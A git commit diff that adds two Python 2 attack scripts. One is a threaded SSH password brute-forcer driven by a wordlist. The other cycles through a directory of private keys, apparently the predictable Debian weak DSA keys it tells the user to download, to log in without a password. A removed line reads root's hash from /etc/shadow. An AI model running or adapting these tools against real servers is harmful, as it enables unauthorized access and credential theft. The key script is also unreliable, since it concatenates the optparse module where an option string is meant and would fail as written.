2983324f3752384d1e8d106a97e7e26ecfe936dd
supraz <supraz69@gmail.com>
2013-12-10 19:04:03 +0100

    SSH brute key checking without password

--- ssh_brute_force/sshbrute_short.py
+++ ssh_brute_force/sshbrute_short.py
@@ -1,25 +1,65 @@
 import pxssh
+import optparse
+import time
+from threading import *
 
 
-def send_command(s, cmd):
-    s.sendline(cmd)
-    s.prompt()
-    print s.before
+MAX_CONNECTIONS = 5
+connection_lock = BoundedSemaphore(value=MAX_CONNECTIONS)
+found = False
+fails = 0
 
 
-def connect(host, user, password):
+def connect(host, user, password, release):
+    global found
+    global fails
     try:
         s = pxssh.pxssh()
         s.login(host, user, password)
-        return s
-    except:
-        print '[-] Error Connecting'
-        exit(0)
+        print '[+] Password found'
+        found = True
+    except Exception, e:
+        if 'read_nonblocking' in str(e):
+            fails += 1
+            time.sleep(5)
+            connect(host, user, password, False)
+        elif 'synchronize with original prompt' in str(e):
+            time.sleep(1)
+            connect(host, user, password, False)
+    finally:
+        if release: connection_lock.release()
 
 
 def main():
-    s = connect('localhost', 'root', 'password')
-    send_command(s, 'cat /etc/shadow | grep root')
+    parser = optparse.OptionParser('Usage %prog -H <target host> '
+                                   '-u <username> -F <password list>')
+    parser.add_option('-H', dest='tgt_host', type='string',
+                      help='specify target host')
+    parser.add_option('-u', dest='user', type='string',
+                      help='specify username')
+    parser.add_option('-F', dest='passwd_file', type='string',
+                      help='specify password list')
+    (options, args) = parser.parse_args()
+    host = options.tgt_host
+    user = options.user
+    passwd_file = options.passwd_file
+    if host == None or user == None or passwd_file == None:
+        print parser.usage
+        exit(0)
+    fn = open(passwd_file, 'r')
+    for line in fn.readlines():
+        if found:
+            print '[*] Exiting: password found'
+            exit(0)
+        if fails > 5:
+            print '[!] Exiting: too many socket timeouts'
+            exit(0)
+        connection_lock.acquire()
+        password = line.strip('\r').strip('\n')
+        print '[-] Testing: ' + str(password)
+        t = Thread(target=connect, args=(host, user, password, True))
+        child = t.start()
 
-if __name__ == "__main__":
+
+if __name__ == '__main__':
     main()
---
+++ ssh_brute_without_password/ssh_brute_without_pass.py
@@ -0,0 +1,77 @@
+"""
+To use this script properly you will need to google for debian_
+ssh_dsa_1024_x86.tar.bz2 package.
+"""
+
+import pexpect
+import optparse
+import os
+from threading import *
+
+
+MAX_CONNECTIONS = 5
+connection_lock = BoundedSemaphore(MAX_CONNECTIONS)
+stop = False
+fails = 0
+
+
+def connect(user, host, keyfile, release):
+    global stop
+    global fails
+    try:
+        perm_denied = 'Permission denied'
+        ssh_newkey = 'Are you sure want to continue'
+        conn_closed = 'Connection closed by remote host'
+        opt = ' -o PasswordAuthentication=no'
+        conn_str = 'ssh ' + user + '@' + host + ' -i ' + keyfile + optparse
+        child = pexpect.spawn(conn_str)
+        ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey,
+                            conn_closed, '$', '#'])
+        if ret == 2:
+            print '[-] Adding host to: ~/.ssh/known_hosts'
+            child.sendline('yes')
+            connect(user, host, keyfile, False)
+        elif ret == 3:
+            print '[-] Connection closed by remote host'
+            fails += 1
+        elif ret > 3:
+            print '[+] Success. ' + str(keyfile)
+            stop = True
+    finally:
+        if release:
+            connection_lock.release()
+
+
+def main():
+    parser = optparse.OptionParser('Usage %prog -H <target host>'
+                                   '-u <user> -d <directory>')
+    parser.add_option('-H', dest='tgt_host', type='string',
+                      help='specify target host')
+    parser.add_option('-d', dest='pass_dir', type='string',
+                      help='specify directory with keys')
+    parser.add_option('-u', dest='user', type='string',
+                      help='specify username')
+    (options, args) = parser.parse_args()
+    host = options.tgt_host
+    dir = options.pass_dir
+    user = options.user
+    if host == None or dir == None or user == None:
+        print parser.usage
+        exit(0)
+    for filename in os.listdir(dir):
+        if stop:
+            print '[*] Exiting: key found.'
+            exit(0)
+        if fails > 5:
+            print '[!] Exiting! Too many connection closed by remote host.'
+            print '[!] Adjust number of simultaneous threads.'
+            exit(0)
+        connection_lock.acquire()
+        fullpath = os.path.join(dir, filename)
+        print '[-] Testing keyfile ' + str(fullpath)
+        t = Thread(target=connect, args=(user, host, fullpath, True))
+        child = t.start()
+
+
+if __name__ == "__main__":
+    main()
